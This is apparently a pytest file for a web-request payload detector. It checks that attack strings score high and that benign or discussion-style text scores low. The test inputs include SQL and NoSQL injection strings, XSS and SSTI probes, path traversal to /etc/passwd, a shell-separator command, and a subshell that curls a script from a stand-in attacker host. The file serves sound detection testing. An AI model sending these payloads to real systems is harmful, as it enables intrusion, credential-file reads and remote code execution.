import asyncio

from adiuvare.core.models import RequestContext
from adiuvare.signals.payload import PayloadSignal


def test_payload_stays_clean_when_empty():
    ctx = RequestContext(
        identity="u1",
        payload=None,
        url="/",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_sqlish_text():
    ctx = RequestContext(
        identity="u1",
        payload="select * from users",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_script_text():
    ctx = RequestContext(
        identity="u1",
        payload="<script>alert(1)</script>",
        url="/comment",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/comment",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_does_not_flag_normal_select_text():
    ctx = RequestContext(
        identity="u1",
        payload="please select an option",
        url="/settings",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/settings",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_path_traversal_text():
    ctx = RequestContext(
        identity="u1",
        payload="../../etc/passwd",
        url="/download",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/download",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score > 0.5


def test_payload_decodes_wrapped_script_text():
    ctx = RequestContext(
        identity="u1",
        payload="%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        url="/comment",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/comment",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_comment_truncation_text():
    ctx = RequestContext(
        identity="u1",
        payload="admin'--",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_marks_shell_separator_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="name=ok;cat /etc/passwd",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_subshell_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="$(curl http://evil.example/p.sh)",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_boolean_tautology_text():
    ctx = RequestContext(
        identity="u1",
        payload="' OR 'a'='a",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_marks_ssti_expression_text():
    ctx = RequestContext(
        identity="u1",
        payload="{{7*7}}",
        url="/render",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/render",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_nested_nosql_operator_text():
    ctx = RequestContext(
        identity="u1",
        payload='{"username":{"$ne":null}}',
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_encoded_function_sqli_text():
    ctx = RequestContext(
        identity="u1",
        payload="%27%20AND%20updatexml%281%2Cconcat%280x7e%2Cuser%28%29%29%2C1%29--",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_keeps_union_phrase_clean():
    ctx = RequestContext(
        identity="u1",
        payload="union of sets and intervals",
        url="/search",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


# ── Discussion-context detection tests ──────────────────────────────────

def test_discussion_sql_tutorial_backs_off():
    """'How do I write SELECT * FROM users in a tutorial?' should be
    recognised as discussion, not SQL injection."""
    ctx = RequestContext(
        identity="u1",
        payload="How do I write SELECT * FROM users in a tutorial?",
        url="/forum",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/forum",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    # Should still detect the SQL pattern but heavily penalised
    assert res.score <= 0.40, f"expected <=0.40 got {res.score}"
    assert res.score < 0.30 or res.detail.get("discussion_penalty", 1.0) < 1.0


def test_discussion_script_literal_in_docs_backs_off():
    """'How do I print <script> literally in docs?' should be
    recognised as discussion, not XSS."""
    ctx = RequestContext(
        identity="u1",
        payload="How do I print <script> literally in docs?",
        url="/forum",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/forum",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score <= 0.40, f"expected <=0.40 got {res.score}"


def test_discussion_what_does_select_mean():
    """'what does SELECT mean in this context?' is educational, not an attack."""
    ctx = RequestContext(
        identity="u1",
        payload="what does SELECT mean in this context?",
        url="/forum",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/forum",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score <= 0.40, f"expected <=0.40 got {res.score}"


def test_discussion_does_not_block_real_sqli():
    """Real SQL injection payloads must still score high."""
    ctx = RequestContext(
        identity="u1",
        payload="' OR 'a'='a",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.80, f"expected >=0.80 got {res.score}"


def test_discussion_does_not_block_real_xss():
    """Real XSS payloads must still score high."""
    ctx = RequestContext(
        identity="u1",
        payload="<script>alert(1)</script>",
        url="/comment",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/comment",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.60, f"expected >=0.60 got {res.score}"


def test_discussion_does_not_block_multifamily_attack():
    """When multiple attack families fire, bypass discussion penalty.
    e.g. payload that is both SQLi and XSS is a real attack."""
    ctx = RequestContext(
        identity="u1",
        payload="<script>SELECT * FROM users WHERE '1'='1'</script>",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.70, f"expected >=0.70 got {res.score}"


def test_discussion_backtick_quoted_sql():
    """SQL inside backticks in a sentence is citation, not injection."""
    ctx = RequestContext(
        identity="u1",
        payload="Can someone explain what `SELECT * FROM users` does?",
        url="/forum",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/forum",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score <= 0.40, f"expected <=0.40 got {res.score}"


def test_discussion_does_not_weaken_path_traversal():
    """Path traversal should not be affected by discussion detection."""
    ctx = RequestContext(
        identity="u1",
        payload="../../etc/passwd",
        url="/download",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/download",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.50, f"expected >=0.50 got {res.score}"


def test_discussion_question_with_risky_text_still_detected():
    """Discussion context should lower but not zero out the score.
    If a genuine SQL pattern exists inside a question, we still report
    a non-zero score — just lower."""
    ctx = RequestContext(
        identity="u1",
        payload="How do I use DROP TABLE in PostgreSQL?",
        url="/forum",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/forum",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    # Still detects something, but penalised
    assert 0.10 <= res.score <= 0.55, f"expected 0.10<=score<=0.55 got {res.score}"
